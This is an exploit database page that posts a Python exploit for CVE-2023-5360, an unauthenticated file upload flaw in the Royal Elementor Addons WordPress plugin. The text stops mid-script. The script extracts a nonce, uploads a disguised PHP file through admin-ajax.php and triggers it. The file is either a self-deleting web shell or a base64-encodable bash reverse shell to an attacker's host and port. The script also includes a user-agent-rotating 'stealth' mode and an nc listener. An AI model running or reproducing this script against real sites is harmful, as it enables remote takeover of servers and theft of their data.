---
title: Royal Elementor Addons - Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025110016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-24
fetch_date: 2025-11-25T03:11:48.175449
---

# Royal Elementor Addons - Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Royal Elementor Addons - Unauthenticated Remote Code Execution** **2025.11.24**  Credit:  **[ibrahimsql](https://cxsecurity.com/author/ibrahimsql/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-5360](https://cxsecurity.com/cveshow/CVE-2023-5360/ "Click to see CVE-2023-5360")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "Click to see CWE-434")** | |

#!/usr/bin/env python3
# Title Royal Elementor Addons - Unauthenticated Remote Code Execution CVE-2023-5360
# Author @ibrahimsql https://ibrahimsql.com
# Date 10/17/2025
# Vendor https://royal-elementor-addons.com/
# Reference https://nvd.nist.gov/vuln/detail/CVE-2023-5360
# https://github.com/ibrahmsql
import argparse
import base64
import json
import random
import re
import requests
import string
import subprocess
import sys
import threading
import time
from io import BytesIO
from urllib.parse import urlparse
requests.packages.urllib3.disable\_warnings()
USER\_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]
class RoyalElementorExploit:
def \_\_init\_\_(self, target, stealth=False, verbose=False):
self.target = target.rstrip('/')
self.parsed = urlparse(target)
self.root = f"{self.parsed.scheme}://{self.parsed.netloc}"
self.session = requests.Session()
self.stealth = stealth
self.verbose = verbose
self.nonce = None
if stealth:
self.session.headers.update({'User-Agent': random.choice(USER\_AGENTS)})
else:
self.session.headers.update({'User-Agent': 'python-requests'})
def log(self, msg, level="info"):
prefix = {"info": "[\*]", "success": "[+]", "error": "[-]", "debug": "[D]"}
if level == "debug" and not self.verbose:
return
print(f"{prefix.get(level, '[\*]')} {msg}")
def verify\_target(self):
self.log("Verifying target vulnerability...")
try:
r = self.session.get(self.target, timeout=10, verify=False)
if r.status\_code != 200:
self.log(f"Target returned HTTP {r.status\_code}", "error")
return False
if "elementor" not in r.text.lower():
self.log("Target doesn't appear to use Elementor", "error")
return False
self.log("Target validated", "success")
return True
except Exception as e:
self.log(f"Connection failed: {e}", "error")
return False
def extract\_nonce(self):
self.log("Extracting Elementor nonce...")
if self.stealth:
time.sleep(random.uniform(0.5, 2.0))
try:
r = self.session.get(self.target, timeout=10, verify=False)
match = re.search(r'WprConfig\s\*=\s\*\{[^}]\*"nonce"\s\*:\s\*"([a-f0-9]+)"', r.text)
if not match:
self.log("Failed to extract nonce", "error")
return False
self.nonce = match.group(1)
self.log(f"Nonce extracted: {self.nonce}", "success")
return True
except Exception as e:
self.log(f"Nonce extraction failed: {e}", "error")
return False
def generate\_payload(self, mode, lhost=None, lport=None, encode=False):
shell\_name = ''.join(random.choices(string.ascii\_letters + string.digits, k=12))
if mode == "webshell":
cmd\_param = ''.join(random.choices(string.ascii\_letters, k=6))
payload = f"<?php if(isset($\_GET['{cmd\_param}'])) {{system($\_GET['{cmd\_param}']);}} unlink(\_\_FILE\_\_); ?>"
return payload, shell\_name, cmd\_param
elif mode == "reverse":
shell\_cmd = f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &'"
if encode:
encoded = base64.b64encode(shell\_cmd.encode()).decode()
payload = f"<?php exec(base64\_decode('{encoded}')); unlink(\_\_FILE\_\_); ?>"
else:
payload = f"<?php exec(\"{shell\_cmd}\"); unlink(\_\_FILE\_\_); ?>"
return payload, shell\_name, None
return None, None, None
def upload\_payload(self, payload, shell\_name, retries=3):
self.log(f"Uploading payload (retries: {retries})...")
for attempt in range(1, retries + 1):
self.log(f"Attempt {attempt}/{retries}", "debug")
if self.stealth and attempt > 1:
time.sleep(random.uniform(1.0, 3.0))
data = {
'wpr\_addons\_nonce': self.nonce,
'max\_file\_size': 100,
'allowed\_file\_types': ',',
'action': 'wpr\_addons\_upload\_file',
'triggering\_event': 'click'
}
files = {
'uploaded\_file': (f"{shell\_name}.php.", BytesIO(payload.encode()))
}
try:
r = self.session.post(
f"{self.root}/wp-admin/admin-ajax.php",
data=data,
files=files,
timeout=15,
verify=False
)
self.log(f"Upload response: HTTP {r.status\_code}", "debug")
response\_data = r.json()
shell\_url = response\_data.get('data', {}).get('url')
if shell\_url:
self.log(f"Payload uploaded: {shell\_url}", "success")
return shell\_url
self.log(f"Upload failed: {response\_data}", "debug")
except Exception as e:
self.log(f"Upload attempt failed: {e}", "debug")
self.log("All upload attempts failed", "error")
return None
def trigger\_shell(self, shell\_url, mode):
self.log("Triggering payload...")
try:
r = self.session.get(shell\_url, timeout=5, verify=False)
if mode == "reverse":
self.log("Reverse shell triggered (timeout expected)", "success")
else:
self.log(f"Shell triggered: HTTP {r.status\_code}", "success")
return True
except requests.exceptions.Timeout:
if mode == "reverse":
self.log("Reverse shell triggered (timeout is normal)", "success")
return True
except Exception as e:
self.log(f"Trigger failed: {e}", "error")
return False
def exploit(self, mode, lhost=None, lport=None, encode=False, listen=False):
if not self.verify\_target():
return False
if not self.extract\_nonce():
return False
payload, shell\_name, cmd\_param = self.generate\_payload(mode, lhost, lport, encode)
if not payload:
self.log("Payload generation failed", "error")
return False
if mode == "reverse" and listen:
self.log(f"Starting listener on {lhost}:{lport}...")
listener\_thread = threading.Thread(
target=lambda: subprocess.call(['nc', '-lvnp', str(lport)]),
daemon=True
)
listener\_thread.star...